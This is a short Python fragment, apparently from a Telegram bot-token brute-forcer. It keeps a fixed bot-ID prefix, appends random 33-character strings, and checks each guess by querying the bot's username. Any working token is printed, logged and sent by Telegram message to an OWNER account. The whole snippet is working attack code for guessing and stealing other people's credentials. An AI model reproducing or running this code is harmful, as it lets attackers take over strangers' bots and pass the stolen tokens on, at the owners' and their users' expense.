#ADMlNxd 2.006
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
for k in range(500):
  token = "609517172:AA" + "".join(random.choices(chars,k=33))
  new_bot = Bot(token)
  try:
    username = new_bot.username
  except:
    username = None
    pass
  if username:
    print(token)
    LOGGING(username)
    LOGGING(token[11:])
    new_bot.send_message(OWNER, token)
    LOGGING("Har Har Mahadev 🚩")
    LOGGING("#FOUND")
  if botNo == THREAD_COUNT - 1:
    ATTEMPT += 1
    if ATTEMPT % 500 == 0:
      LOGGING(f"```{GROUP_NAME}``` Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
